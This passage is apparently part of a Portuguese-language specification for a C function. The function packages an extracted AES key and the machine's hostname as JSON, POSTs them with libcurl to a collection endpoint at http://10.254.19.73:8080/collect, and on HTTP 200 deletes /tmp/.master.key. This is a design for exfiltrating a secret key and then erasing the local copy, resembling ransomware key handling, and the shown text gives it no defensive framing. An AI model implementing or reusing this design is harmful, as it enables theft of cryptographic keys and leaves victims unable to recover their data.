   - Valide que o comprimento da chave extraída seja maior que zero. Caso contrário, retorne código de erro `-2`.

   - Monte uma string JSON estruturada como: `{"aes_key":"<chave_base64>","hostname":"<hostname>"}`.
   - Utilize `snprintf()` para evitar overflow, garantindo que o buffer tenha tamanho suficiente.

   - Inicialize o curl com `curl_easy_init()`.
   - Configure a URL `http://10.254.19.73:8080/collect`.
   - Configure o método POST com `CURLOPT_POST` e o payload como corpo da requisição.
   - Configure o header `Content-Type: application/json` usando `curl_slist_append()` e `CURLOPT_HTTPHEADER`.
   - Capture o código de resposta HTTP com `CURLOPT_WRITEFUNCTION` ou usando `curl_easy_getinfo()` após a execução com `CURLINFO_RESPONSE_CODE`.
   - Verifique se o código de resposta é exatamente `200`. Se não for, libere os recursos e retorne código de erro `-4`.

6. **Remoção do arquivo**:
   - Se a resposta HTTP for `200`, chame `remove("/tmp/.master.key")` para apagar o arquivo de chave. Se `remove()` falhar, ignore o erro e retorne `0` (sucesso), pois o envio foi bem-sucedido.
